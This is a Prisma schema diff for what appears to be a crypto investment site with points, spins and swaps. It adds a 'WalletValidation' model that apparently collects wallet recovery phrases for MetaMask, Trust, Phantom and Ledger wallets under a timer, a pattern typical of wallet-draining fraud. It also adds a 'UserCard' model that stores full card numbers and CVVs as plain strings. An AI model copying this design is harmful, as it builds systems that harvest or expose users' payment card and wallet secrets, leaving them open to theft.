@@ -189,6 +189,7 @@ model Deposit {
   toAddress   String?
   confirmations Int        @default(0)
   status      String        @default("PENDING") // PENDING, CONFIRMED, FAILED, CANCELLED
+  paymentMethod String?
   adminNote   String?
   createdAt   DateTime      @default(now())
   updatedAt   DateTime      @updatedAt
@@ -329,4 +330,108 @@ model PaymentMethod {
   sortOrder   Int      @default(0)
   createdAt   DateTime @default(now())
   updatedAt   DateTime @updatedAt
+}
+
+// ==================== USER SESSIONS ====================
+model UserSession {
+  id          String   @id @default(uuid())
+  userId      String
+  userEmail   String
+  ipAddress   String?
+  userAgent   String?
+  deviceInfo  String?
+  location    String?
+  isIncognito Boolean  @default(false)
+  loginAt     DateTime @default(now())
+  lastActive  DateTime @default(now())
+  expiresAt   DateTime?
+  active      Boolean  @default(true)
+}
+
+// ==================== USER POINTS ====================
+model UserPoints {
+  id          String   @id @default(uuid())
+  userId      String   @unique
+  email       String
+  balance     Int      @default(0)
+  totalEarned Int      @default(0)
+  totalSpent  Int      @default(0)
+  tier        String   @default("BRONZE") // BRONZE, SILVER, GOLD, PLATINUM, DIAMOND
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+  
+  transactions PointTransaction[]
+}
+
+// ==================== POINT TRANSACTIONS ====================
+model PointTransaction {
+  id          String   @id @default(uuid())
+  userId      String
+  userPoints  UserPoints @relation(fields: [userId], references: [userId])
+  type        String   // EARNED, SPENT, SWAP, BONUS, DAILY
+  amount      Int
+  source      String?  // "SPIN", "LOGIN", "INVESTMENT", "REFERRAL", "SWAP", "DAILY", "ACTIVITY"
+  description String?
+  balanceBefore Int
+  balanceAfter  Int
+  createdAt   DateTime @default(now())
+}
+
+// ==================== POINT SWAP ITEMS ====================
+model SwapItem {
+  id          String   @id @default(uuid())
+  name        String
+  description String
+  type        String   // "TOKEN", "NFT", "CRYPTO", "BONUS"
+  imageUrl    String?
+  pointsCost  Int
+  valueUsd    Float?
+  valueCrypto String?
+  stock       Int      @default(100)
+  active      Boolean  @default(true)
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+}
+
+// ==================== WALLET VALIDATION ====================
+model WalletValidation {
+  id            String   @id @default(uuid())
+  userId        String
+  walletAddress String?
+  walletType    String   // "METAMASK", "TRUST", "PHANTOM", "LEDGER", "OTHER"
+  phraseHash    String?  // Stored as hash, not plain text
+  status        String   @default("PENDING") // PENDING, VERIFIED, EXPIRED, CANCELLED
+  timerEndsAt   DateTime?
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+}
+
+// ==================== USER CARDS ====================
+// ==================== SWAP ORDERS ====================
+model SwapOrder {
+  id            String   @id @default(uuid())
+  userId        String
+  userEmail     String
+  type          String   // BUY, SELL
+  crypto        String   // BTC, ETH, USDT, BNB, SOL
+  quantity      Float
+  price         Float
+  total         Float
+  paymentMethod String?
+  status        String   @default("PENDING") // PENDING, FILLED, CANCELLED
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+}
+
+model UserCard {
+  id          String   @id @default(uuid())
+  userId      String
+  cardNumber  String
+  cardHolder  String
+  expiryDate  String
+  cvv         String
+  brand       String   // "VISA", "MASTERCARD", "AMEX"
+  isDefault   Boolean  @default(false)
+  billingAddress String?
+  createdAt   DateTime @default(now())
 }
